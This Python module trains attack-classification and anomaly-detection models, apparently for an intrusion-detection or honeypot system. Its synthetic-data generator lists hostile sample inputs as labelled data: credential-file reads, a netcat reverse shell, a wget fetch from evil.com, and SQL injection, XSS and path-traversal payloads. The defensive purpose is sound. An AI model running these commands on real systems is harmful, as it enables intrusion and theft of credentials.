"""
ML Trainer Module

Training pipeline for attack classification models.
"""

from __future__ import annotations

import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

import numpy as np
import pandas as pd
from sklearn.model_selection import train_test_split

from ml.models import AnomalyDetector, AttackClassifier, HyperparameterTuner
from ml.preprocessor import AttackPreprocessor

logger = logging.getLogger(__name__)


class ModelTrainer:
    """
    Training pipeline for ML models.
    
    Handles data loading, preprocessing, training, evaluation, and saving.
    """

    def __init__(
        self,
        model_dir: str | Path = "ml/models",
        test_size: float = 0.2,
        random_state: int = 42,
    ):
        self._model_dir = Path(model_dir)
        self._model_dir.mkdir(parents=True, exist_ok=True)
        self._test_size = test_size
        self._random_state = random_state

        self._preprocessor = AttackPreprocessor()
        self._classifier: Optional[AttackClassifier] = None
        self._anomaly_detector: Optional[AnomalyDetector] = None

        self._training_history: list[dict] = []

    def load_data(self, source: str | Path | pd.DataFrame) -> pd.DataFrame:
        """
        Load training data from various sources.
        
        Args:
            source: File path (CSV/JSON) or DataFrame
            
        Returns:
            DataFrame with attack data
        """
        if isinstance(source, pd.DataFrame):
            return source

        path = Path(source)
        if path.suffix == '.csv':
            return pd.read_csv(path)
        elif path.suffix == '.json':
            return pd.read_json(path)
        else:
            raise ValueError(f"Unsupported file format: {path.suffix}")

    def prepare_data(
        self,
        data: pd.DataFrame,
        target_column: str = 'attack_type',
    ) -> tuple[np.ndarray, np.ndarray, np.ndarray, np.ndarray]:
        """
        Prepare data for training.
        
        Args:
            data: Raw attack data
            target_column: Column containing labels
            
        Returns:
            X_train, X_test, y_train, y_test
        """
        # Preprocess features
        X = self._preprocessor.fit_transform(data)
        y = self._preprocessor.encode_labels(data[target_column])

        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X, y,
            test_size=self._test_size,
            random_state=self._random_state,
            stratify=y,
        )

        logger.info(f"Training set: {len(X_train)} samples")
        logger.info(f"Test set: {len(X_test)} samples")

        return X_train, X_test, y_train, y_test

    def train_classifier(
        self,
        X_train: np.ndarray,
        y_train: np.ndarray,
        tune_hyperparams: bool = False,
        **kwargs,
    ) -> AttackClassifier:
        """
        Train the attack classifier.
        
        Args:
            X_train: Training features
            y_train: Training labels
            tune_hyperparams: Whether to run hyperparameter tuning
            **kwargs: Additional model parameters
            
        Returns:
            Trained classifier
        """
        if tune_hyperparams:
            logger.info("Running hyperparameter tuning...")
            tuner = HyperparameterTuner()
            results = tuner.tune(X_train, y_train)
            logger.info(f"Best params: {results['best_params']}")
            logger.info(f"Best score: {results['best_score']:.4f}")
            self._classifier = tuner.get_tuned_classifier()
        else:
            self._classifier = AttackClassifier(**kwargs)

        logger.info("Training classifier...")
        self._classifier.fit(X_train, y_train)

        return self._classifier

    def train_anomaly_detector(
        self,
        X_train: np.ndarray,
        contamination: float = 0.1,
    ) -> AnomalyDetector:
        """
        Train the anomaly detector.
        
        Args:
            X_train: Training features
            contamination: Expected proportion of anomalies
            
        Returns:
            Trained anomaly detector
        """
        logger.info("Training anomaly detector...")
        self._anomaly_detector = AnomalyDetector(contamination=contamination)
        self._anomaly_detector.fit(X_train)

        return self._anomaly_detector

    def evaluate(
        self,
        X_test: np.ndarray,
        y_test: np.ndarray,
    ) -> dict[str, Any]:
        """
        Evaluate trained models.
        
        Returns:
            Dictionary with evaluation metrics
        """
        results = {}

        if self._classifier:
            logger.info("Evaluating classifier...")
            metrics = self._classifier.evaluate(X_test, y_test)
            results['classifier'] = {
                'accuracy': metrics.accuracy,
                'precision': metrics.precision,
                'recall': metrics.recall,
                'f1': metrics.f1,
                'classification_report': metrics.classification_report,
            }
            logger.info(f"Classifier F1: {metrics.f1:.4f}")

        if self._anomaly_detector:
            logger.info("Evaluating anomaly detector...")
            anomaly_results = self._anomaly_detector.get_anomaly_scores(X_test)
            anomaly_count = sum(1 for r in anomaly_results if r['is_anomaly'])
            results['anomaly_detector'] = {
                'anomalies_detected': anomaly_count,
                'anomaly_rate': anomaly_count / len(X_test),
            }
            logger.info(f"Anomalies detected: {anomaly_count}/{len(X_test)}")

        return results

    def save_models(self, version: str = "v1") -> dict[str, str]:
        """
        Save trained models to disk.
        
        Args:
            version: Model version string
            
        Returns:
            Dictionary with saved file paths
        """
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        paths = {}

        if self._classifier:
            classifier_path = self._model_dir / f"classifier_{version}_{timestamp}.pkl"
            self._classifier.save(classifier_path)
            paths['classifier'] = str(classifier_path)
            logger.info(f"Saved classifier to {classifier_path}")

        if self._anomaly_detector:
            anomaly_path = self._model_dir / f"anomaly_detector_{version}_{timestamp}.pkl"
            self._anomaly_detector.save(anomaly_path)
            paths['anomaly_detector'] = str(anomaly_path)
            logger.info(f"Saved anomaly detector to {anomaly_path}")

        # Save preprocessor
        preprocessor_path = self._model_dir / f"preprocessor_{version}_{timestamp}.pkl"
        import pickle
        with open(preprocessor_path, 'wb') as f:
            pickle.dump(self._preprocessor, f)
        paths['preprocessor'] = str(preprocessor_path)

        # Save training metadata
        metadata = {
            'version': version,
            'timestamp': timestamp,
            'paths': paths,
            'classes': self._preprocessor.classes,
        }
        metadata_path = self._model_dir / f"metadata_{version}_{timestamp}.json"
        with open(metadata_path, 'w') as f:
            json.dump(metadata, f, indent=2)

        return paths

    def run_full_pipeline(
        self,
        data: str | Path | pd.DataFrame,
        target_column: str = 'attack_type',
        tune_hyperparams: bool = False,
        version: str = "v1",
    ) -> dict[str, Any]:
        """
        Run the complete training pipeline.
        
        Args:
            data: Training data source
            target_column: Label column name
            tune_hyperparams: Whether to tune hyperparameters
            version: Model version
            
        Returns:
            Training results and metrics
        """
        start_time = datetime.utcnow()

        # Load and prepare data
        logger.info("Loading data...")
        df = self.load_data(data)
        logger.info(f"Loaded {len(df)} samples")

        X_train, X_test, y_train, y_test = self.prepare_data(df, target_column)

        # Train models
        self.train_classifier(X_train, y_train, tune_hyperparams)
        self.train_anomaly_detector(X_train)

        # Evaluate
        eval_results = self.evaluate(X_test, y_test)

        # Save models
        paths = self.save_models(version)

        # Record training history
        duration = (datetime.utcnow() - start_time).total_seconds()
        history_entry = {
            'timestamp': start_time.isoformat(),
            'duration_seconds': duration,
            'num_samples': len(df),
            'version': version,
            'metrics': eval_results,
            'paths': paths,
        }
        self._training_history.append(history_entry)

        logger.info(f"Training completed in {duration:.2f} seconds")

        return {
            'metrics': eval_results,
            'paths': paths,
            'duration': duration,
        }


def generate_synthetic_data(n_samples: int = 1000) -> pd.DataFrame:
    """
    Generate synthetic attack data for testing/demo.
    
    Args:
        n_samples: Number of samples to generate
        
    Returns:
        DataFrame with synthetic attack data
    """
    np.random.seed(42)

    attack_types = [
        'reconnaissance', 'brute_force', 'sql_injection',
        'xss', 'rce', 'path_traversal', 'credential_theft',
    ]

    commands = {
        'reconnaissance': ['ls -la', 'cat /etc/passwd', 'whoami', 'id', 'uname -a', 'ps aux'],
        'brute_force': ['', '', '', ''],  # Usually no commands, just auth attempts
        'sql_injection': ["' OR 1=1--", "UNION SELECT * FROM users", "'; DROP TABLE--"],
        'xss': ["<script>alert(1)</script>", "<img onerror=alert(1)>"],
        'rce': ["; cat /etc/passwd", "| nc -e /bin/sh", "$(wget http://evil.com/shell)"],
        'path_traversal': ["../../../etc/passwd", "....//etc/shadow"],
        'credential_theft': ['cat ~/.ssh/id_rsa', 'cat /etc/shadow'],
    }

    paths = {
        'reconnaissance': ['/', '/admin', '/api/users'],
        'brute_force': ['/login', '/wp-login.php', '/admin/login'],
        'sql_injection': ['/search?q=', '/api/user?id=', '/product?id='],
        'xss': ['/search?q=', '/comment', '/profile'],
        'rce': ['/api/exec', '/cgi-bin/test', '/shell.php'],
        'path_traversal': ['/files?path=', '/download?file=', '/static/'],
        'credential_theft': ['/admin', '/config', '/.env'],
    }

    data = []
    for _ in range(n_samples):
        attack_type = np.random.choice(attack_types)

        record = {
            'timestamp': datetime.utcnow().isoformat(),
            'source_ip': f"{np.random.randint(1,255)}.{np.random.randint(0,255)}.{np.random.randint(0,255)}.{np.random.randint(1,255)}",
            'source_port': np.random.randint(1024, 65535),
            'destination_port': np.random.choice([22, 80, 443, 21, 8080]),
            'service_type': np.random.choice(['ssh', 'http', 'ftp']),
            'attack_type': attack_type,
            'command': np.random.choice(commands.get(attack_type, [''])),
            'path': np.random.choice(paths.get(attack_type, ['/'])),
            'severity': np.random.randint(1, 11),
            'body_size': np.random.randint(0, 10000),
        }
        data.append(record)

    return pd.DataFrame(data)
